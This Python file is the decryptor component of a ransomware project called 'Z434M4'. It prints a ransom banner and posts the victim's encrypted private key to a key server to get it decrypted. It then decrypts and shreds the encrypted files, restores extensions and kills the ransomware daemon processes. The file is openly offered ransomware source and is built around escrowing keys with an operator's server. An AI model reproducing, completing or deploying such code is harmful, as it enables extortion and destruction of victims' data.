import environment
import symmetric
import utils

import subprocess
import requests
import base64
import string 
import random
import sys
import time
import os
import pickle

from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

logo = """
███████╗██╗  ██╗██████╗ ██╗  ██╗███╗   ███╗██╗  ██╗
╚══███╔╝██║  ██║╚════██╗██║  ██║████╗ ████║██║  ██║
  ███╔╝ ███████║ █████╔╝███████║██╔████╔██║███████║
 ███╔╝  ╚════██║ ╚═══██╗╚════██║██║╚██╔╝██║╚════██║
███████╗     ██║██████╔╝     ██║██║ ╚═╝ ██║     ██║
╚══════╝     ╚═╝╚═════╝      ╚═╝╚═╝     ╚═╝     ╚═╝
                                       
    ALL YOUR FILES ARE ENCRYPTED WITH AES-CBC-256
    YOUR COMPUTER IS INFECTED WITH MALWARE THAT ENCRYPTED ALL YOUR IMPORTANT FILES
    THE ONLY WAY TO GET THEM BACK IS WITH THIS DECRYPTOR
"""


BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', \
                                                 '\33[93m', '\033[1;35m', '\033[1;32m', \
                                                  '\033[0m'

# environment paths
ransomware_name = ("Z434M4")
server_address = ("http://localhost:8000")
home = environment.get_home_path()
desktop = environment.get_desktop_path()
username = environment.get_username()
ransomware_path = os.path.join(home, ransomware_name)
machine_id = environment.get_unique_machine_id()


def kill_daemon():
    process = subprocess.Popen("pidof daemon", shell=True, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = process.stdout.read() + process.stderr.read()
    process2 = subprocess.Popen("pidof Z434M4", shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    pid_of_Z434M4 = process2.stdout.read() + process2.stderr.read()
    
    process3 = subprocess.Popen("pidof python main.py", shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    pid_of_Z434M4_2 = process3.stdout.read() + process3.stderr.read()
    try:
        pid_of_Z434M4_2 = pid_of_Z434M4_2.split(' ')[0]
    except: 
        pass

    os.system('kill -9 {}'.format(pid_of_Z434M4))
    os.system('kill -9 {}'.format(pid_of_Z434M4_2))
    os.system('kill -9 {}'.format(output))
    os.system("killall daemon")
    os.system('killall Z434M4')
    os.system('killall ./Z434M4')
    os.system('killall ./daemon')


def decrypt_aes_keys(enc, key):
    key_obj = serialization.load_pem_private_key(
        key.encode('utf-8') if isinstance(key, str) else key,
        password=None
    )
    plaintext = key_obj.decrypt(
        enc,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext


def send_to_server_encrypted_private_key(id, private_encrypted_key):
    try:
        ret = requests.post(server_address, data=private_encrypted_key)
    except Exception as e:
        raise e

    print("key decrypted")

    private_key = ret.text
    return str(private_key)


def payment():
    pass


def menu():
    print("{}Importing the encrypted client private key".format(WHITE))
    try:
        with open(os.path.join(ransomware_path, 'encrypted_client_private_key.key'),
                  'rb') as f:
            encrypted_client_private_key = pickle.load(f)
    except IOError:
        print("encrypted client private key not found, \
              I'm sorry. but all your files are lost!")
        sys.exit(-1)

    print("{}OK{}".format(GREEN, WHITE))

    key_to_be_sent = base64.b64encode(str(encrypted_client_private_key))

    # send to server to be decrypted
    while True:
        try:
            print("Requesting to server to decrypt the private key")
            client_private_key = send_to_server_encrypted_private_key(machine_id, key_to_be_sent)
            break
        except:
            print("{}No connection, sleeping for 2 minutes\nConnect \
                  to internet to get your files back!{}".format(RED, WHITE))
            time.sleep(120)

    # saving to disk the private key
    print("{}Client private key decrypted and stored to disk{}".format(GREEN, WHITE))
    with open(os.path.join(ransomware_path, "client_private_key.PEM"), 'wb') as f:
        f.write(client_private_key)

    # GET THE AES KEYS and path
    try:
        with open(os.path.join(ransomware_path, "AES_encrypted_keys.txt")) as f:
            content = f.read()
    except IOError:
        print("AES keys not found. Sorry but all your files are lost!")
        sys.exit(-1)

    # get the aes keys and IV's and paths back
    print('Decrypting the files ...')
    content = content.split('\n')
    content.remove('')
    aes_and_path = []
    for line in content:
        ret = line.split(' ') # enc(KEY) base64(PATH)
        encrypted_aes_key = base64.b64decode(ret[0])
        aes_key = decrypt_aes_keys(encrypted_aes_key, client_private_key)

        aes_and_path.append((aes_key, base64.b64decode(ret[1])))

    for _ in aes_and_path:
        dec = symmetric.AESCipher(_[0])
        
        with open(_[1], 'rb') as f:
            encrypted_file_content = f.read()
        
        # decrypt content
        decrypted_file_content = dec.decrypt(encrypted_file_content)

        # save into new file without .Z434M4 extension
        old_file_name = _[1].replace(".Z434M4", "")
        with open(old_file_name, 'w') as f:
            f.write(decrypted_file_content)
        
        # delete old encrypted file
        utils.shred(_[1])

    # Look for the extensions file
    extensions_file_path = os.path.join(ransomware_path, "file_extensions.dat.Z434M4")
    if os.path.exists(extensions_file_path):
        # Find its key in the aes_and_path list
        for item in aes_and_path:
            if extensions_file_path.encode('utf-8') in item[1]:
                ext_key = item[0]
                
                # Decrypt the extensions file
                with open(extensions_file_path, 'rb') as f:
                    encrypted_ext_data = f.read()
                    
                dec = symmetric.AESCipher(ext_key)
                decrypted_ext_data = dec.decrypt(encrypted_ext_data)
                
                # Load the extensions map
                extensions_map = pickle.loads(decrypted_ext_data)
                
                # Restore all file extensions
                for encrypted_path, original_ext in extensions_map.items():
                    if os.path.exists(encrypted_path):
                        try:
                            # Rename to restore original extension
                            file_base = os.path.splitext(encrypted_path)[0]
                            os.rename(encrypted_path, file_base + original_ext)
                            print(f"Restored extension for {file_base + original_ext}")
                        except Exception as e:
                            print(f"Error restoring extension for {encrypted_path}: {str(e)}")

    # end of decryptor
    print("{}Decryption finished!{}".format(GREEN, WHITE))

    # kill deamon running on bg
    kill_daemon()


if __name__ == "__main__": 
    print(logo)
    menu()